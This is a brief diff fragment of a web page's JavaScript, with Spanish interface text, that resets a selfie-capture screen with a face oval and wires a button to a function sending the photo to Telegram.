+    photoTaken = false;
+    currentPhotoData = null;
+    stableFrames = 0;
+    progressBar.style.width = "0%";
+    sendBtn.style.display = "none";
+    
+    const preview = document.querySelector('.photo-preview');
+    if (preview) preview.remove();
+    
+    reset("🔄 Reiniciado - Coloca tu rostro");
+    oval.classList.remove("valid");
+    
+    statusText.innerText = "✅ Listo para nueva selfie";
+    setTimeout(() => {
+        statusText.innerText = "🎯 Coloca tu rostro en el óvalo";
+    }, 2000);
+});
+
+// Botón de enviar a Telegram
+sendBtn.addEventListener('click', () => {
+    enviarATelegram();
 });
 </script>
 
